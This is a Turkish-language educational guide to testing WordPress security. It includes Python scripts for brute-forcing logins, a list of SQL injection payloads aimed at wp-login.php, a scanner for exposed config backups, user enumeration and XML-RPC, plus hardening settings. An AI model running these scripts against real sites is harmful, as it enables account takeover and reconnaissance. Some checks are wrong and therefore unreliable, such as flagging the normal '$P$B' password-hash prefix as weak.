# WordPress Güvenlik Testleri - Eğitim Rehberi

## ⚠️ ÖNEMLİ UYARILAR

1. **Sadece kendi sahip olduğunuz sistemlerde test yapın**
2. **Test ortamını production'dan ayrı tutun**
3. **Yasal izinleriniz olmadan başka sitelerde test yapmayın**
4. **Bu araçlar sadece eğitim ve kendi güvenliğinizi test etmek içindir**

## Test Ortamı Kurulumu

### 1. Yerel Test Ortamı (Önerilen)

```bash
# Docker ile WordPress test ortamı
docker-compose up -d

# Veya XAMPP/WAMP kullanarak yerel kurulum
```

### 2. İzole Test Sunucusu
- Ayrı bir VPS veya yerel sanal makine kullanın
- Production verilerini asla test ortamında kullanmayın

## Güvenlik Test Kategorileri

### A. Zayıf Kimlik Doğrulama Testleri

#### 1. Brute Force Koruması Test
```python
# Brute force saldırı simülasyonu (sadece kendi sitenizde)
import requests
import itertools
from time import sleep

def test_brute_force_protection(target_url, usernames, passwords):
    """
    Kendi WordPress sitenizin brute force korumasını test eder
    """
    print("⚠️  SADECE KENDİ SİTENİZDE KULLANIN!")
    
    login_url = f"{target_url}/wp-login.php"
    
    for username, password in itertools.product(usernames, passwords):
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In'
        }
        
        response = requests.post(login_url, data=data)
        
        if "ERROR" not in response.text:
            print(f"⚠️  Potansiyel zayıf kimlik bilgisi: {username}:{password}")
        
        sleep(1)  # Rate limiting için bekleme

# Örnek kullanım (sadece test ortamınızda)
# test_usernames = ['admin', 'administrator', 'test']
# test_passwords = ['123456', 'password', 'admin']
# test_brute_force_protection('http://localhost:8080', test_usernames, test_passwords)
```

#### 2. SQL Injection Test Scripti
```python
import requests
from urllib.parse import urlencode

def test_sql_injection(target_url):
    """
    WordPress login formunda SQL injection açığı test eder
    """
    print("SQL Injection test başlatılıyor...")
    
    # Yaygın SQL injection payloadları
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or 1=1#",
        "' or 1=1--",
        "') or '1'='1--",
        "') or ('1'='1--"
    ]
    
    login_url = f"{target_url}/wp-login.php"
    
    for payload in payloads:
        data = {
            'log': payload,
            'pwd': 'test',
            'wp-submit': 'Log In'
        }
        
        try:
            response = requests.post(login_url, data=data, timeout=10)
            
            # Başarılı giriş veya SQL hatası kontrolü
            if any(indicator in response.text.lower() for indicator in [
                'dashboard', 'wp-admin', 'mysql', 'sql syntax', 'database error'
            ]):
                print(f"⚠️  Potansiyel SQL Injection: {payload}")
                
        except requests.RequestException as e:
            print(f"Bağlantı hatası: {e}")

# test_sql_injection('http://localhost:8080')
```

### B. Database Güvenlik Testi

#### 3. WordPress Veritabanı Güvenlik Checker
```python
import mysql.connector
from mysql.connector import Error

def check_wp_database_security(host, database, username, password):
    """
    WordPress veritabanının güvenlik yapılandırmasını kontrol eder
    """
    try:
        connection = mysql.connector.connect(
            host=host,
            database=database,
            user=username,
            password=password
        )
        
        if connection.is_connected():
            cursor = connection.cursor()
            
            # 1. Zayıf şifreli kullanıcıları kontrol et
            cursor.execute("""
                SELECT user_login, user_pass 
                FROM wp_users 
                WHERE user_pass LIKE '$P$B%' OR LENGTH(user_pass) < 30
            """)
            
            weak_passwords = cursor.fetchall()
            if weak_passwords:
                print("⚠️  Zayıf şifre hash'leri tespit edildi:")
                for user, hash_val in weak_passwords:
                    print(f"   Kullanıcı: {user}")
            
            # 2. Admin yetkili kullanıcıları listele
            cursor.execute("""
                SELECT u.user_login, u.user_email, m.meta_value
                FROM wp_users u
                JOIN wp_usermeta m ON u.ID = m.user_id
                WHERE m.meta_key = 'wp_capabilities'
                AND m.meta_value LIKE '%administrator%'
            """)
            
            admins = cursor.fetchall()
            print(f"\n📊 Admin kullanıcı sayısı: {len(admins)}")
            
            # 3. Veritabanı prefix kontrolü
            cursor.execute("SHOW TABLES")
            tables = cursor.fetchall()
            
            wp_prefix_tables = [table[0] for table in tables if table[0].startswith('wp_')]
            if wp_prefix_tables:
                print("⚠️  Varsayılan 'wp_' prefix kullanılıyor (güvenlik riski)")
            
    except Error as e:
        print(f"Veritabanı bağlantı hatası: {e}")
    
    finally:
        if connection.is_connected():
            cursor.close()
            connection.close()

# Örnek kullanım:
# check_wp_database_security('localhost', 'wordpress_test', 'root', 'password')
```

### C. WordPress Güvenlik Tarayıcısı

#### 4. Kapsamlı WordPress Güvenlik Tarayıcısı
```python
import requests
import re
from bs4 import BeautifulSoup

class WordPressSecurityScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def check_version(self):
        """WordPress versiyonunu tespit eder"""
        try:
            response = self.session.get(f"{self.target_url}/wp-admin/")
            version_match = re.search(r'ver=(\d+\.\d+(?:\.\d+)?)', response.text)
            
            if version_match:
                version = version_match.group(1)
                print(f"📌 WordPress Versiyon: {version}")
                return version
        except:
            pass
        return None
    
    def check_common_files(self):
        """Yaygın WordPress dosyalarını kontrol eder"""
        common_files = [
            '/wp-config.php',
            '/wp-config.php.bak',
            '/wp-config.php~',
            '/wp-admin/install.php',
            '/readme.html',
            '/license.txt',
            '/wp-content/debug.log'
        ]
        
        print("\n🔍 Yaygın dosya kontrolü:")
        for file_path in common_files:
            try:
                response = self.session.get(f"{self.target_url}{file_path}")
                if response.status_code == 200:
                    print(f"⚠️  Erişilebilir dosya: {file_path}")
            except:
                pass
    
    def check_user_enumeration(self):
        """Kullanıcı numaralandırma açığını kontrol eder"""
        print("\n👥 Kullanıcı numaralandırma kontrolü:")
        
        for user_id in range(1, 6):
            try:
                response = self.session.get(f"{self.target_url}/?author={user_id}")
                if response.status_code == 200 and 'author' in response.url:
                    # Kullanıcı adını çıkar
                    soup = BeautifulSoup(response.text, 'html.parser')
                    title = soup.find('title')
                    if title:
                        print(f"🔍 Kullanıcı ID {user_id}: {title.text}")
            except:
                pass
    
    def check_xmlrpc(self):
        """XML-RPC servisini kontrol eder"""
        try:
            response = self.session.post(
                f"{self.target_url}/xmlrpc.php",
                data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                headers={'Content-Type': 'text/xml'}
            )
            
            if response.status_code == 200 and 'methodResponse' in response.text:
                print("⚠️  XML-RPC aktif (potansiyel güvenlik riski)")
        except:
            pass
    
    def scan(self):
        """Tam güvenlik taraması yapar"""
        print(f"🚀 WordPress güvenlik taraması başlatılıyor: {self.target_url}")
        print("="*60)
        
        self.check_version()
        self.check_common_files()
        self.check_user_enumeration()
        self.check_xmlrpc()
        
        print("\n✅ Tarama tamamlandı!")

# Kullanım:
# scanner = WordPressSecurityScanner('http://localhost:8080')
# scanner.scan()
```

## Güvenlik Sertleştirme Önerileri

### 1. Temel Güvenlik Önlemleri

```php
// wp-config.php güvenlik ayarları
define('DISALLOW_FILE_EDIT', true);
define('FORCE_SSL_ADMIN', true);
define('WP_DEBUG', false);

// Güvenlik anahtarları
define('AUTH_KEY', 'güçlü-rastgele-anahtar');
// ... diğer anahtarlar
```

### 2. .htaccess Güvenlik Kuralları

```apache
# wp-admin dizini koruma
<Files wp-config.php>
    Order allow,deny
    Deny from all
</Files>

# XML-RPC devre dışı
<Files xmlrpc.php>
    Order allow,deny
    Deny from all
</Files>

# Brute force koruması
<RequireAll>
    Require all granted
    Require not ip 192.168.1.100
</RequireAll>
```

## Yasal Uyarılar ve İyi Pratikler

1. **Sadece kendi sistemlerinizde test yapın**
2. **Test verilerini production'dan ayrı tutun**
3. **Güvenlik açıklarını sorumlu bir şekilde bildirin**
4. **Test sonuçlarını güvenli bir şekilde saklayın**

## Sonuç

Bu araçlar sadece eğitim amaçlı ve kendi WordPress sitenizin güvenliğini test etmek içindir. Herhangi bir güvenlik açığı tespit ettiğinizde, derhal düzeltme işlemlerine başlayın.

**Unutmayın:** En iyi savunma, proaktif güvenlik önlemleridir!